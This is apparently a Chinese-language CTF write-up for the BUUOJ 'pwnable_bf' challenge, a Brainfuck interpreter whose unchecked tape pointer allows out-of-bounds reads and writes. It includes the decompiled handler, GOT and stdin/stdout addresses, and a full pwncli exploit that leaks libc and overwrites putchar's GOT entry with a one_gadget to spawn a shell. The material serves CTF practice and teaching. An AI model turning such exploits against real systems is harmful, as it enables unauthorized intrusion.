# buuoj-pwn-pwnable_bf
## 总结
- bss段上存储libc地址的地方有很多，最值得注意的就是stdin、stdout

- brainfuck的认识（虽然这题没用 [、] )，如下：

| 字符 | 含义 |
| ---- | ---- |
| `>`  | 指针加一 |
| `<`  | 指针减一 |
| `+`  | 指针指向的字节的值加一 |
| `-`  | 指针指向的字节的值减一 |
| `.`  | 输出指针指向的单元内容（ASCII码） |
| `,`  | 输入内容到指针指向的单元（ASCII码） |
| `[`  | 如果指针指向的单元值为零，向后跳转到对应的 `]` 指令的下一指令处 |
| `]`  | 如果指针指向的单元值不为零，向前跳转到对应的 `[` 指令的下一指令处 |

| Brainfuck | C |
| --------- | - |
| `>`       | `++ptr;` |
| `<`       | `--ptr;` |
| `+`       | `++*ptr;` |
| `-`       | `--*ptr;` |
| `.`       | `putchar(*ptr);` |
| `,`       | `*ptr = getchar();` |
| `[`       | `while (*ptr) {` |
| `]`       | `}` |

## 题目分析
简单一看就知道本题实现了brain fuck解释器，具体逻辑如下：
```c
int __cdecl do_brainfuck(char a1)
{
  int result; // eax
  _BYTE *v2; // ebx

  result = a1 - 43;
  switch ( a1 )
  {
    case '+':
      result = p;
      ++*(_BYTE *)p;
      break;
    case ',':
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case '-':
      result = p;
      --*(_BYTE *)p;
      break;
    case '.':
      result = putchar(*(char *)p);
      break;
    case '<':
      result = --p;
      break;
    case '>':
      result = ++p;
      break;
    case '[':
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

而漏洞也在这里，就是对p指针没有进行限制，我们可以利用它越界写越界读，那么我们来看看它附近能利用的数据吧，如下

```
puts@got	0x804A018
putchar@got	0x0804A030
stdout@@GLIBC_2_0	0x804A060
stdin@@GLIBC_2_0	0x804A040
p=tape	0x0804A0a0
```

那么思路很明显，如下：

- 利用stdout泄露libc
- 往puts函数的got表写ogg(失败咯！库鲁西)
- 那就打putschar的got改成ogg！

## EXP

```python
#!/usr/bin/env python3

'''
Author: 7resp4ss
Date: 2022-12-23 23:08:22
LastEditTime: 2022-12-23 23:29:28
Description: 
'''

from pwncli import *

cli_script()

io = gift["io"]
elf = gift["elf"]
libc = gift.libc

filename  = gift.filename # current filename
is_debug  = gift.debug # is debug or not 
is_remote = gift.remote # is remote or not
gdb_pid   = gift.gdb_pid # gdb pid if debug

if gift.remote:
    libc = ELF("./libc-2.23.so")
    gift["libc"] = libc



pd = ''
pd+= '<'*0x40   #now p in 0x804a040
pd+= '.>'*4     #now p in 0x804a044
pd+= '<'*(0x48 + 0x4 - 0x18) #now p in 0x804a030
pd+= ',>'*4
pd+= '.'


sla('except [ ]',pd)
lb = recv_current_libc_addr(libc.sym._IO_2_1_stdout_)
libc.address = lb
log_address_ex2(lb)
sleep(1)
'''
$ one_gadget libc-2.23.so
0x3a80c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3a80e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3a812 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3a819 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5f065 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5f066 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
'''

ogg = p64(lb + 0x5f066)
#ogg = p64(libc.sym.gets)
for i in range(4):
    s(ogg[i:i+1])

io.interactive()
```
（虽然有一点很奇怪，我将p移到stdout居然要0x40个<...过几天再研究吧）

不用过几天了，调试一看就知道是因为p的地址是tape的地址，也就是0x804a0a0